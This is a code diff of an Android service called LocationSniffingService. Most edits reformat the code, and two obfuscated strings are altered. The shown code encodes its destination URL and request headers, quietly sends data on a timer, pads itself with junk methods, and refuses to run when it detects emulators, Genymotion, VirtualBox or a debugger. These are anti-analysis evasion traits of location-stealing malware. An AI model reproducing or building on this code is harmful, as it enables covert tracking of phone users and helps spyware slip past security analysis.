@@ -51,12 +51,15 @@ public class LocationSniffingService extends Service{
         int delay = 5000;
 
         mTimer.scheduleAtFixedRate(new TimerTask() {
+			
             @Override
             public void run() {
-                if (thisDoesnotDoAnything())
+                if (thisDoesnotDoAnything()){
                     return;
-                else
+				}
+                else{
                     thisAlsoDoesnotDoAnything();
+				}
             }
         }, 0,delay);
 
@@ -92,10 +95,10 @@ public class LocationSniffingService extends Service{
             String urlString = "d102jd012jasd";
             String http = "uas0j1d12dasDas";
             String requestProperty1 = "aspdk2DasdmaSDa==";
-            String requestProperty2 = "as=a=sdnasd2d22d2";
+            String requestProperty2 = "as=sdnasd2d22d2";
             String requestProperty3 = "ask20asdj20jd9";
             String requestProperty4 = "asdSDs22d@d222==";
-            String requestProperty5 = "20k20dk20ASD/**/2d==";
+            String requestProperty5 = "20k20dk20ASD2d==";
 
             try{
                 urlString = StringHelper.getStringStatic(urlString);
@@ -147,8 +150,9 @@ public class LocationSniffingService extends Service{
 
         Log.d(TAG,"Checking...");
         boolean b = false;
-        if (isValid())
+        if (isValid()){
             b = sendQuietly();
+		}
         Log.d(TAG, isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
@@ -233,38 +237,35 @@ public class LocationSniffingService extends Service{
         }
 
         //Check build's fingerprint
-        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
-                fingerprint.startsWith(unknown);
+        Boolean checkFingerprint =  fingerprint.startsWith(generic) || fingerprint.startsWith(unknown);
 
         //Check build's model
-        Boolean checkModel =        model.contains(googlesdk) ||
-                model.contains(emulator) ||
-                model.contains(androidsdk86);
+        Boolean checkModel =        model.contains(googlesdk) || model.contains(emulator) || model.contains(androidsdk86);
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
-                manufacturer.contains(unknown);
+        Boolean checkManufacturer = manufacturer.contains(genymotion) || manufacturer.contains(unknown);
 
         //Check build's product
-        Boolean checkProduct = product.contains(sdk) ||
-                product.contains(vbox);
+        Boolean checkProduct = product.contains(sdk) || product.contains(vbox);
 
         //Check for goldfish hardware
-        Boolean checkHardware = hardware.contains(goldfish) ||
-                hardware.contains(vbox);
+        Boolean checkHardware = hardware.contains(goldfish) || hardware.contains(vbox);
 
         //Return if any is detected
-        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
+        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware){
             return false;
+		}
 
         //Check for telephone operator
         //Return if it is android
-        if(android.equals(telephoneoperator))
-            return false;
+		if(android.equals(telephoneoperator)){
+				return false;
+		}
 
         //Return if debugger is connected
-        if(Debug.isDebuggerConnected())
+        if(Debug.isDebuggerConnected()){
             return false;
+		}
 
         return true;
     }
